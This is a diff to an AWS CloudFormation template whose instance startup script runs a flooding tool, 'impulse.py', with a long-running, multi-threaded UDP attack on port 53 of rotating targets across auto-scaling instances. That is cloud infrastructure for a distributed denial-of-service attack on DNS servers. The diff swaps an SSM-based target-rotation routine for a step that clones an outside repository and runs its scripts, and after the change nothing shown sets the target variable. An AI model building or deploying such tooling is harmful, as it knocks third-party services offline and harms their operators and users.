@@ -103,32 +103,9 @@ Resources:
             /opt/aws/bin/cfn-init -v --region ${AWS::Region} --stack ${AWS::StackName} --resource LaunchConfig --configsets InstallAndRun
             # Send OK signal to the CloudFormation stack
             /opt/aws/bin/cfn-signal -e $? --region ${AWS::Region} --stack ${AWS::StackName} --resource ASGWebAPP
-            # Read TARGET from SSM parameter
-            R=$((1+$RANDOM % 10))
-            declare -a TARGETS
-            while [ "$SEM" != "$(hostname)" ]; do
-              while [ "$SEM" != "available" ]; do
-                echo ------wait available sem--------
-                sleep $R
-                SEM=$(aws ssm get-parameter --name "/${SSMPrefix}/sem" --region ${AWS::Region}|jq -r .Parameter.Value)
-              done
-              #set parameter write lock in the semaphore
-              aws ssm put-parameter --name "/${SSMPrefix}/sem" --overwrite --region ${AWS::Region}--value $(hostname)
-              sleep $R
-              #check if lock successful
-              SEM=$(aws ssm get-parameter --name "/${SSMPrefix}/sem" --region ${AWS::Region}|jq -r .Parameter.Value)
-            done
-            #get first element as TARGET and shift it to the end of array
-            TARGETS=($(aws ssm get-parameter --name "/${SSMPrefix}/targets" --region ${AWS::Region}|jq -r .Parameter.Value))
-            TARGET=${TARGETS[0]}
-            unset TARGETS[0]
-            TARGETS+=($TARGET)
-            echo ------------TARGET=$TARGET-------------------
-            #update rotated TARGETS in the SSM parameter
-            T=$(printf "%s\n" "${TARGETS[@]}")
-            aws ssm put-parameter --name "/${SSMPrefix}/targets" --overwrite --region ${AWS::Region}--value "$T"
-            #release lock
-            aws ssm put-parameter --name "/${SSMPrefix}/sem" --overwrite --region ${AWS::Region} --value "available"
+            # get and run user_data scripts
+            git clone https://github.com/YuriiVK/webapp.git && cd webapp/user_data
+            pwd
             ########################################################################
             #Put your commands here                                                #
             #A variable $TARGET have one of string from /dns/targets SSM parameter #
@@ -138,7 +115,7 @@ Resources:
             pip3 install -r requirements.txt
             python3 impulse.py --target $TARGET:53 --time 100000 --threads 100 --method UDP
             #
-            ##########################
+            ##########################№№№№№№№№№№№№№№№№№№№№№№№№№№№№№№№№№№№№№№№№№№№№№№
     Metadata:
       AWS::CloudFormation::Init:
         configSets:
